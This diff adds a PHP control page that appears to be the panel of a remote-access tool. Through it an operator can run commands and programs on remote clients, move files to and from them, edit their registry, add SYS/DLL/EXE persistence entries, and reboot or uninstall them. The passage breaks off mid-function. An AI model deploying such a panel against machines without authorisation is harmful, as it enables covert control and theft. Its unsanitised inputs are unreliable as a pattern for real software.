@@ -1,0 +1,973 @@
+<?php
+error_reporting(0);
+session_start();
+header("Content-type:text/HTML;charset=utf-8");
+/*******************************************************************************
+// FUNCTION TO HANDLE COMMANDS
+*******************************************************************************/
+function HandleCommand($szCmdStr)
+{
+	$output = "";
+	$progress = "c:\\progress." . $_SESSION["g_commport"];
+	$path = "c:\\input." . $_SESSION["g_commport"];
+	$fp = fopen($path,"w");
+	if($fp)
+	{
+		//write command to file
+		fprintf($fp, $szCmdStr);
+		fclose($fp);
+		//wait for response, the server program will delete the input-file after executing the command
+		$wait_count = 0;
+		while(file_exists($path))
+		{
+			//query every 50 microseconds
+			usleep(50000);
+			//count waiting time
+			$wait_count++;
+			//wait at most 10 seconds (200 * 50ms)
+			if($wait_count>200)
+			{
+				if(file_exists($progress))
+				{
+					unlink($progress);
+					$wait_count = 0;
+				}
+				else
+				{
+					$wait_count = -1;
+					break;
+				}
+			}
+		}
+		if($wait_count == -1)
+		{
+			$output = "ERROR1: Request timed out, the server program may not be running.";
+			unlink($path);
+		}
+		else
+		{
+			//read result from file
+			$path = "c:\\output." . $_SESSION["g_commport"];
+			$fp = fopen($path,"r");
+			if($fp)
+			{
+				$output = fread($fp, filesize($path));
+				fclose($fp);
+				unlink($path);
+			}
+			else
+			{
+				$output = "ERROR2: Failed to read result.";
+			}
+		}
+	}
+	else
+	{
+		$output = "ERROR0: Failed to send command.";
+	}
+	return $output;
+}
+/*******************************************************************************
+// MAIN FUNCTION
+*******************************************************************************/
+if($_SESSION["g_username"]!="" && $_SESSION["g_commport"]!="")
+{
+	if(!empty($_POST['btnListClients']))
+	{
+		$szReturn = HandleCommand("lc");
+		$array = explode("\r\n", $szReturn);
+		echo '<h2><pre>';
+		for($i = 0; $i < count ($array); $i++)
+		{
+			if($i<2)
+			{
+				echo '<input type="checkbox" name="clients[]" value="' . $array[$i] . '" disabled>'. $array[$i] . '</input><br>';
+			}
+			else
+			{
+				echo '<input type="checkbox" name="clients[]" value="' . $array[$i] . '" id="' . $array[$i] .'"><label for="' . $array[$i] . '">'. $array[$i] . '</label></input><br>';
+			}
+		}
+		echo '</pre></h2>';
+	}
+	else if(!empty($_POST['btnConnect']))
+	{
+		$sa = explode(" ", $_POST['btnConnect']);
+		echo HandleCommand("cc\r\n" . $sa[0]);
+	}
+	else if(!empty($_POST['btnDisconnect']))
+	{
+		$sa = explode(" ", $_POST['btnDisconnect']);
+		echo HandleCommand("dc\r\n" . $sa[0]);
+	}
+	else if(!empty($_POST['btnShutdown']))
+	{
+		$sa = explode(" ", $_POST['btnShutdown']);
+		echo HandleCommand("sc\r\n" . $sa[0]);
+	}
+	else if(!empty($_POST['btnReboot']))
+	{
+		$sa = explode(" ", $_POST['btnReboot']);
+		echo HandleCommand("rc\r\n" . $sa[0]);
+	}
+	else if(!empty($_POST['btnDIR']))
+	{
+		$sa = explode(" ", $_POST['btnDIR']);
+		echo HandleCommand("dir\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnDLF']))
+	{
+		$sa = explode(" ", $_POST['btnDLF']);
+		echo HandleCommand("dlf\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnUPF']))
+	{
+		$sa = explode(" ", $_POST['btnUPF']);
+		echo HandleCommand("upf\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnREG']))
+	{
+		$sa = explode(" ", $_POST['btnREG']);
+		echo HandleCommand("reg\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnEXE']))
+	{
+		$sa = explode(" ", $_POST['btnEXE']);
+		echo HandleCommand("exe\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnCMD']))
+	{
+		$sa = explode(" ", $_POST['btnCMD']);
+		echo HandleCommand("cmd\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnConfig']))
+	{
+		$sa = explode(" ", $_POST['btnConfig']);
+		echo HandleCommand("config\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnUpdate']))
+	{
+		$sa = explode(" ", $_POST['btnUpdate']);
+		echo HandleCommand("uc\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnUninstall']))
+	{
+		$sa = explode(" ", $_POST['btnUninstall']);
+		echo HandleCommand("uc\r\n" . $sa[0]);
+	}
+	else if(!empty($_POST['btnAddBin']))
+	{
+		$sa = explode(" ", $_POST['btnAddBin']);
+		echo HandleCommand("addbin\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2'] . "\r\n" . $_POST['p3'] . "\r\n" . $_POST['p4']);
+	}
+	else if(!empty($_POST['btnDelBin']))
+	{
+		$sa = explode(" ", $_POST['btnDelBin']);
+		echo HandleCommand("delbin\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnClearBin']))
+	{
+		$sa = explode(" ", $_POST['btnClearBin']);
+		echo HandleCommand("clrbin\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnQueryBin']))
+	{
+		$sa = explode(" ", $_POST['btnQueryBin']);
+		echo HandleCommand("qrybin\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnCreateKey']))
+	{
+		$sa = explode(" ", $_POST['btnCreateKey']);
+		echo HandleCommand("rgo_ck\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnDeleteKey']))
+	{
+		$sa = explode(" ", $_POST['btnDeleteKey']);
+		echo HandleCommand("rgo_dk\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnRenameKey']))
+	{
+		$sa = explode(" ", $_POST['btnRenameKey']);
+		echo HandleCommand("rgo_rk\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnDeleteValue']))
+	{
+		$sa = explode(" ", $_POST['btnDeleteValue']);
+		echo HandleCommand("rgo_dv\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnQueryValue']))
+	{
+		$sa = explode(" ", $_POST['btnQueryValue']);
+		echo HandleCommand("rgo_qv\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnSetValue']))
+	{
+		$sa = explode(" ", $_POST['btnSetValue']);
+		echo HandleCommand("rgo_sv\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2'] . "\r\n" . $_POST['p3'] . "\r\n" . $_POST['p4']);
+	}
+	else if(!empty($_POST['btnCreateFile']))
+	{
+		$sa = explode(" ", $_POST['btnCreateFile']);
+		echo HandleCommand("fso_c_f\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnCreateDirectory']))
+	{
+		$sa = explode(" ", $_POST['btnCreateDirectory']);
+		echo HandleCommand("fso_c_d\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnCopyFileDir']))
+	{
+		$sa = explode(" ", $_POST['btnCopyFileDir']);
+		echo HandleCommand("fso_cpy\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnDelFileDir']))
+	{
+		$sa = explode(" ", $_POST['btnDelFileDir']);
+		echo HandleCommand("fso_del\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnRenameFileDir']))
+	{
+		$sa = explode(" ", $_POST['btnRenameFileDir']);
+		echo HandleCommand("fso_ren\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnSetAttrFileDir']))
+	{
+		$sa = explode(" ", $_POST['btnSetAttrFileDir']);
+		echo HandleCommand("fso_s_a\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnGetAttrFileDir']))
+	{
+		$sa = explode(" ", $_POST['btnGetAttrFileDir']);
+		echo HandleCommand("fso_g_a\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnHttpDownload']))
+	{
+		$sa = explode(" ", $_POST['btnHttpDownload']);
+		echo HandleCommand("fso_h_d\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnGetFileCRC32']))
+	{
+		$sa = explode(" ", $_POST['btnGetFileCRC32']);
+		echo HandleCommand("fso_gfc\r\n" . $sa[0] . "\r\n" . $_POST['p1']);
+	}
+	else if(!empty($_POST['btnDelayMovDel']))
+	{
+		$sa = explode(" ", $_POST['btnDelayMovDel']);
+		echo HandleCommand("fso_mfx\r\n" . $sa[0] . "\r\n" . $_POST['p1'] . "\r\n" . $_POST['p2']);
+	}
+	else if(!empty($_POST['btnTest']))
+	{
+		$sa = explode(" ", $_POST['btnTest']);
+		echo HandleCommand("tc\r\n" . $sa[0]);
+	}
+}
+else
+{
+	echo "<script language='javascript' type='text/javascript'>window.location.href='index.php';</script>";
+}
+?>
+<script type="text/javascript">
+function post_request(sUrl, sRequest)
+{
+	var oHTTP;
+	if (window.XMLHttpRequest)
+	{
+		oHTTP = new XMLHttpRequest();
+	}
+	else 
+	{
+		oHTTP = new ActiveXObject("Microsoft.XMLHTTP");//IE6
+	}
+	oHTTP.open("POST", sUrl, false);
+	oHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	oHTTP.setRequestHeader("Content-Length", sRequest.length);
+	oHTTP.send(sRequest)
+	return oHTTP.responseText;
+}
+function handle_client_request(action)
+{
+	var selcnt = 0,items = document.getElementsByName("clients[]");
+	document.frmFunction.txtOUT.value = "";
+	for (i = 0; i < items.length; i++)
+	{
+		if (items[i].checked) 
+		{
+			var result = "";
+			selcnt++;
+			if(action==0)
+			{
+				result = post_request("main.php","btnDisconnect=" + items[i].value);
+			}
+			else if(action==1)
+			{
+				result = post_request("main.php","btnConnect=" + items[i].value);
+			}
+			else if(action==2)
+			{
+				result = post_request("main.php","btnShutdown=" + items[i].value);
+			}
+			else if(action==3)
+			{
+				result = post_request("main.php","btnReboot=" + items[i].value);
+			}
+			else if(action==4)
+			{
+				result = post_request("main.php","btnDIR=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==5)
+			{
+				result = post_request("main.php","btnDLF=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==6)
+			{
+				result = post_request("main.php","btnUPF=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==7)
+			{
+				result = post_request("main.php","btnREG=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==8)
+			{
+				result = post_request("main.php","btnEXE=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==9)
+			{
+				result = post_request("main.php","btnCMD=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==10)
+			{
+				result = post_request("main.php","btnConfig=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==11)
+			{
+				result = post_request("main.php","btnUpdate=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==12)
+			{
+				result = post_request("main.php","btnUninstall=" + items[i].value);
+			}
+			else if(action==13)
+			{
+				result = post_request("main.php","btnAddBin=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value + "&p3=" + document.frmFunction.txtP3.value + "&p4=" + document.frmFunction.txtP4.value);
+			}
+			else if(action==14)
+			{
+				result = post_request("main.php","btnDelBin=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==15)
+			{
+				result = post_request("main.php","btnClearBin=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==16)
+			{
+				result = post_request("main.php","btnQueryBin=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==17)
+			{
+				result = post_request("main.php","btnCreateKey=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==18)
+			{
+				result = post_request("main.php","btnDeleteKey=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==19)
+			{
+				result = post_request("main.php","btnRenameKey=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==20)
+			{
+				result = post_request("main.php","btnDeleteValue=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==21)
+			{
+				result = post_request("main.php","btnQueryValue=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==22)
+			{
+				result = post_request("main.php","btnSetValue=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value + "&p3=" + document.frmFunction.txtP3.value + "&p4=" + document.frmFunction.txtP4.value);
+			}
+			else if(action==23)
+			{
+				result = post_request("main.php","btnCreateFile=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==24)
+			{
+				result = post_request("main.php","btnCreateDirectory=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==25)
+			{
+				result = post_request("main.php","btnCopyFileDir=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==26)
+			{
+				result = post_request("main.php","btnDelFileDir=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==27)
+			{
+				result = post_request("main.php","btnRenameFileDir=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==28)
+			{
+				result = post_request("main.php","btnSetAttrFileDir=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==29)
+			{
+				result = post_request("main.php","btnGetAttrFileDir=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==30)
+			{
+				result = post_request("main.php","btnHttpDownload=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==31)
+			{
+				result = post_request("main.php","btnGetFileCRC32=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value);
+			}
+			else if(action==32)
+			{
+				result = post_request("main.php","btnDelayMovDel=" + items[i].value + "&p1=" + document.frmFunction.txtP1.value + "&p2=" + document.frmFunction.txtP2.value);
+			}
+			else if(action==33)
+			{
+				result = post_request("main.php","btnTest=" + items[i].value);
+			}
+			result = result.substr(0,result.search("<script type=\"text/javascript\">"));
+			var client_title = items[i].value.replace("Connected ","");
+			client_title = client_title.replace("Offline ","");
+			client_title = client_title.replace("Online ","");
+			document.frmFunction.txtOUT.value = document.frmFunction.txtOUT.value + "[" + client_title + "]" + "\r\n" + result + "\r\n"
+		}
+	}
+	if(selcnt==0)
+	{
+		alert("You must select at least 1 client.");
+	}
+	else
+	{
+		if(action<4 || action==12)
+		{
+			if(confirm("Do you want to refresh the client status? If yes, the page will be refreshed."))
+			{
+				document.frmFunction.btnListClients.click();
+			}
+		}
+		else
+		{
+			alert("Done.");
+			window.scrollTo(0, document.frmFunction.txtOUT.offsetTop)
+		}
+	}
+}
+function select_all_clients(action)
+{
+	var items = document.getElementsByName("clients[]");
+	for (i = 2; i < items.length; i++)
+	{
+		items[i].checked = action;
+	}
+}
+function TextBox_getfocus(obj)
+{
+	obj.select();
+}
+function Radio_click(obj)
+{
+	var items = document.getElementsByName("optTips[]");
+	for (i = 0; i < items.length; i++)
+	{
+		items[i].checked=false;
+	}
+	obj.checked=true;
+}
+function cmbFunction_change(obj)
+{
+	var index = obj.selectedIndex;
+	var val = obj.options[index].value;
+	if(val=="CLIENT_NULL")
+	{
+		document.frmFunction.txtP1.disabled=true;document.frmFunction.txtP1.title="";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_SC")
+	{
+		document.frmFunction.txtP1.disabled=true;document.frmFunction.txtP1.title="";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_RC")
+	{
+		document.frmFunction.txtP1.disabled=true;document.frmFunction.txtP1.title="";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_UC1")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="new client file (on server)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_UC2")
+	{
+		document.frmFunction.txtP1.disabled=true;document.frmFunction.txtP1.title="";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_TC")
+	{
+		document.frmFunction.txtP1.disabled=true;document.frmFunction.txtP1.title="";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_CONFIG")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="new configuration file (on server)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_DIR")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="directory";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_DLF")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file to download (on client)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="file to save (on server)";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_UPF")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file to upload (on server)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="file to save (on client)";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_EXE")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="program file with parameters (optional)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_CMD")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="command to execute";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_ATR_ADD")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="type (SYS = 0, EXE = 1, DLL = 2)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="name";
+		document.frmFunction.txtP3.disabled=false;document.frmFunction.txtP3.title="program file";
+		document.frmFunction.txtP4.disabled=false;document.frmFunction.txtP4.title="program parameters (optional)";
+	}
+	else if(val=="CLIENT_ATR_DEL")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="type (SYS = 0, EXE = 1, DLL = 2)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="name";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_ATR_CLEAR")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="type (SYS = 0, EXE = 1, DLL = 2)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_ATR_QUERY")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="type (SYS = 0, EXE = 1, DLL = 2)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG_CREATE_KEY")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG_DELETE_KEY")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG_RENAME_KEY")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="new key name";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG_DELETE_VALUE")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="value name";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG_QUERY_VALUE")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="value name";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_REG_SET_VALUE")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="registry key (NT path, such as \\Registry\\Machine)";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="value name";
+		document.frmFunction.txtP3.disabled=false;document.frmFunction.txtP3.title="value type (REG_SZ = 1, REG_EXPAND_SZ = 2, REG_MULTI_SZ = 7, REG_BINARY = 3, REG_DWORD = 4, REG_QWORD = 11)";
+		document.frmFunction.txtP4.disabled=false;document.frmFunction.txtP4.title="value data (example: string, |windir|\path, string1||string2||string3, 11 AA bb, 1234 or 0x1234, 0x123456789)";
+	}
+	else if(val=="CLIENT_FSO_CREATE_FILE")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="new file";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="file content (optional, it must be less than 249 characters)";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_CREATE_DIRECTORY")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="new directory";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_COPY")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="source file";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="target file";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_DELETE")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file / directory";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_RENAME")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file / directory";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="new name";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_SET_ATTRIB")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file / directory";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="attribute value (decimal number)";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_GET_ATTRIB")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file / directory";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_HTTP_DOWNLOAD")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="HTTP link";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="save to file";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_GET_CRC32")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="file";
+		document.frmFunction.txtP2.disabled=true;document.frmFunction.txtP2.title="";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
+		document.frmFunction.txtP4.disabled=true;document.frmFunction.txtP4.title="";
+	}
+	else if(val=="CLIENT_FSO_DELAY_MOV_DEL")
+	{
+		document.frmFunction.txtP1.disabled=false;document.frmFunction.txtP1.title="source file";
+		document.frmFunction.txtP2.disabled=false;document.frmFunction.txtP2.title="target file (empty string = remove file after reboot)";
+		document.frmFunction.txtP3.disabled=true;document.frmFunction.txtP3.title="";
